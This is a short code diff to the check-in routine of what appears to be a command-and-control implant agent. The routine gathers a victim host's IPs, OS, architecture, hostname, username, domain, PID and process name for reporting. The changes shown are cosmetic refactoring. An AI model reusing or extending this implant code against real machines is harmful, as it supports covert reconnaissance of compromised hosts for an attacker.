@@ -172,7 +172,7 @@ BOOL CheckinSend()
         Extern IP
     */
 
-    UINT32 numberOfIPs  = 0;
+    
     // uuid + action
     PPackage CheckinData = NULL;    
     CheckinData = PackageInit(CHECKIN, TRUE);
@@ -181,15 +181,20 @@ BOOL CheckinSend()
     PackageAddString(CheckinData, (PCHAR)xenonConfig->agentID, FALSE);
 
     // IP addresses;
-    UINT32 *tableOfIPs = CheckinGetIPAddress(&numberOfIPs);
+    UINT32 numberOfIPs  = 0;
+    UINT32 *tableOfIPs  = CheckinGetIPAddress(&numberOfIPs);
     PackageAddInt32(CheckinData, numberOfIPs);
-    for (UINT32 i = 0; i < numberOfIPs; i++)
+    for (UINT32 i = 0; i < numberOfIPs; i++) 
+    {
         PackageAddInt32(CheckinData, tableOfIPs[i]);
+    }
 
     // OS
     PackageAddString(CheckinData, CheckinGetOsName(), TRUE);
+
     // Arch
     PackageAddByte(CheckinData, CheckinGetArch());
+
     // Hostname
     CHAR Hostname[MAX_PATH];
     if (CheckinGetHostname(Hostname))
@@ -199,6 +204,7 @@ BOOL CheckinSend()
     {
         PackageAddString(CheckinData, "", TRUE);
     }
+
     // Username
     CHAR Username[MAX_PATH];
     if (CheckinGetUserName(Username))
@@ -208,6 +214,7 @@ BOOL CheckinSend()
     {
         PackageAddString(CheckinData, "", TRUE);
     }
+
     // Domain
     WCHAR Domain[MAX_PATH];
     if (CheckinGetDomain(Domain))
@@ -217,8 +224,10 @@ BOOL CheckinSend()
     {
         PackageAddWString(CheckinData, L"", TRUE);
     }
+
     // PID
     PackageAddInt32(CheckinData, GetCurrentProcessId());
+    
     // ProcessName
     CHAR ProcessName[MAX_PATH];
     if (CheckinGetCurrentProcName(ProcessName))
@@ -228,6 +237,7 @@ BOOL CheckinSend()
     {
         PackageAddString(CheckinData, "", TRUE);
     }
+    
     // External IP 
     PackageAddString(CheckinData, (PCHAR) "1.1.1.1", TRUE);    // TODO
 
